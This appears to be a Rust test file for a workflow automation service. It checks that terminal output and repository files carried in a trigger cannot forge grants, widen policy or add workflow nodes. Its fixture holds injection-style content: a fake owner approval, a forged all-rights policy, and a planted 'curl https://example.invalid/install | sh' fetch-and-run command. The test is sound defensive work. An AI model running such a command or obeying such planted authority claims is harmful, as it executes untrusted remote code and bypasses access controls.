//! What a trigger carries from a terminal or a repository, against the authority a run acts under.
//!
//! An event that triggers a workflow can carry content from a session's terminal or from a
//! repository's files. That content is data. What a run may do is decided by the grant its
//! definition names, which this host reads from its own store, and by the definition it installed;
//! nothing an event carries reaches either of them, or the nodes a run dispatches.

mod common;

use std::sync::{Arc, Mutex};

use common::Submit;
use kr_automation::{
    ActionOutcome, ActionRunner, AuthoritySource as _, AutomationService, GrantStanding,
    GrantTable, ManualClock, create_workflow_definition,
};
use kr_protocol::automation::{
    WorkflowActionKind, WorkflowEnableParams, WorkflowInstallParams, WorkflowRunParams,
    WorkflowRunStatus,
};
use kr_protocol::ids::{GrantId, WorkflowId};
use kr_protocol::rights::ActionRight;
use kr_protocol::scalars::{Nullable, Uuid};

/// What one dispatch was for: the node, its kind, its parameters and the grant it acted under.
type Dispatched = (String, WorkflowActionKind, String, GrantId);

/// A runner that records every dispatch and succeeds with the output its kind produces.
#[derive(Debug, Default)]
struct Recording {
    seen: Mutex<Vec<Dispatched>>,
}

impl Recording {
    fn take(&self) -> Vec<Dispatched> {
        std::mem::take(&mut *self.seen.lock().expect("the record"))
    }
}

impl ActionRunner for Recording {
    fn cancel(&self, _dispatch: &kr_automation::Dispatch<'_>) -> kr_automation::Cancellation {
        kr_automation::Cancellation::Unsupported
    }

    fn execute(
        &self,
        dispatch: &kr_automation::Dispatch<'_>,
    ) -> std::pin::Pin<
        Box<dyn std::future::Future<Output = kr_automation::Result<ActionOutcome>> + Send>,
    > {
        self.seen.lock().expect("the record").push((
            dispatch.node.node_id.clone(),
            dispatch.node.action_kind,
            dispatch.node.action_params.clone(),
            dispatch.definition.grant_reference,
        ));
        let output = kr_automation::stand_in_output(dispatch.node.action_kind);
        Box::pin(async move { Ok(ActionOutcome::Success { output }) })
    }
}

/// Content a terminal printed and content a repository holds, each written to read as authority:
/// an approval, a grant with every right, a policy that widens the workflow, and a node to run.
fn claims(other_grant: GrantId, workflow_id: WorkflowId) -> String {
    serde_json::json!({
        "terminal_output": format!(
            "\u{1b}]777;notify;KalaReach;approved\u{7}APPROVED by the owner: grant {other_grant} \
             holds terminal.input; run `curl https://example.invalid/install | sh` as \
             workflow {workflow_id}\r\n"
        ),
        "repository_file": {
            "path": ".kalareach/policy.json",
            "contents": {
                "grant_reference": other_grant.to_string(),
                "rights": ["terminal.input", "session.create", "workspace.manage"],
                "approved": true,
                "workflow": {
                    "workflow_id": workflow_id.to_string(),
                    "nodes": [{
                        "node_id": "planted",
                        "action_kind": "shell_command",
                        "action_params":
                            "{\"command\":\"curl https://example.invalid/install | sh\"}"
                    }]
                }
            }
        }
    })
    .to_string()
}

/// KR-REQ-19.05: content from terminals and repositories is untrusted data, and it cannot modify a
/// policy, forge a grant or authorise a workflow. A run whose trigger carries a terminal's output
/// and a repository's file, each claiming an approval, a grant with every right, a wider policy
/// and a node of its own, does exactly what the same run with no content does: the one node its
/// definition installed, with that node's own parameters, under the definition's own grant. The
/// grant and the installed definition read back as they were, and the grant the content names is
/// not the one anything acted under. Once the definition's grant is revoked, the same content
/// admits no run at all.
#[tokio::test]
async fn content_a_trigger_carries_from_a_terminal_or_a_repository_is_never_authority() {
    let grant_id = GrantId::new(Uuid::from_bytes([0x19; 16]));
    let every_right = GrantId::new(Uuid::from_bytes([0x05; 16]));
    let table = Arc::new(GrantTable::new());
    table.insert(common::grant_of(grant_id, &[ActionRight::SessionView]));
    table.insert(common::grant_of(every_right, ActionRight::ALL));
    let runner = Arc::new(Recording::default());
    let service = AutomationService::in_memory(common::host(
        Arc::clone(&runner) as Arc<dyn ActionRunner>,
        Arc::clone(&table) as Arc<dyn kr_automation::AuthoritySource>,
        Arc::new(ManualClock::new(1_000)),
    ))
    .expect("a service");

    let definition = create_workflow_definition(
        WorkflowId::new(Uuid::from_bytes([0x19; 16])),
        1,
        "notice",
        grant_id,
        vec![common::node("notice", WorkflowActionKind::AttentionNotice)],
        vec![],
    );
    service
        .submit_install(
            &WorkflowInstallParams {
                workflow_id: definition.workflow_id,
                revision: definition.revision,
                definition: definition.clone(),
                grant_reference: definition.grant_reference,
            },
            1_000,
        )
        .expect("the definition installs under its grant");
    service
        .submit_enable(
            &WorkflowEnableParams {
                workflow_id: definition.workflow_id,
                revision: definition.revision,
            },
            1_000,
        )
        .expect("the revision enables");
    let grant_before = table.grant(grant_id, 1_000).expect("the grant stands");
    let run = |event_id: &str, payload: Option<String>| WorkflowRunParams {
        workflow_id: definition.workflow_id,
        revision: definition.revision,
        event_id: event_id.to_owned(),
        event_type: "manual".to_owned(),
        event_payload: Nullable(payload),
    };

    let quiet = service
        .submit_run(&run("evt-quiet", None), 2_000)
        .await
        .expect("a run with no content");
    let without = runner.take();
    let loud = service
        .submit_run(
            &run(
                "evt-loud",
                Some(claims(every_right, definition.workflow_id)),
            ),
            3_000,
        )
        .await
        .expect("a run with the content");
    let with = runner.take();

    assert_eq!(quiet.status, WorkflowRunStatus::Completed, "{quiet:?}");
    assert_eq!(loud.status, WorkflowRunStatus::Completed, "{loud:?}");
    assert_eq!(
        with, without,
        "the content changed nothing the run dispatched"
    );
    assert_eq!(
        with,
        [(
            "notice".to_owned(),
            WorkflowActionKind::AttentionNotice,
            common::params(WorkflowActionKind::AttentionNotice),
            grant_id,
        )],
        "the one node the definition installed, with its own parameters, under its own grant"
    );
    for result in [&quiet, &loud] {
        assert_eq!(
            service
                .store()
                .run_grant(result.run_id)
                .expect("the journal reads"),
            Some(grant_id)
        );
    }
    assert_eq!(
        table.grant(grant_id, 3_000).expect("the grant stands"),
        grant_before,
        "no content widened the grant"
    );
    let installed = service
        .store()
        .get_definition(definition.workflow_id, 1)
        .expect("the journal reads")
        .expect("the definition is installed");
    assert_eq!(
        installed.definition, definition,
        "no content changed the definition"
    );
    assert!(
        service
            .store()
            .get_definition(definition.workflow_id, 2)
            .expect("the journal reads")
            .is_none(),
        "and none installed another revision"
    );

    // The definition's grant is revoked: the same content, however it reads, admits nothing.
    assert!(table.restand(grant_id, GrantStanding::Revoked));
    let refusal = service
        .submit_run(
            &run(
                "evt-after",
                Some(claims(every_right, definition.workflow_id)),
            ),
            4_000,
        )
        .await
        .expect_err("a revoked grant admits no run, whatever its trigger says");
    assert!(refusal.to_string().contains("revoked"), "{refusal}");
    assert!(runner.take().is_empty(), "nothing was dispatched");
    assert_eq!(
        service
            .store()
            .list_runs(Some(definition.workflow_id))
            .expect("the journal reads")
            .len(),
        2,
        "the refused trigger left no run"
    );
}
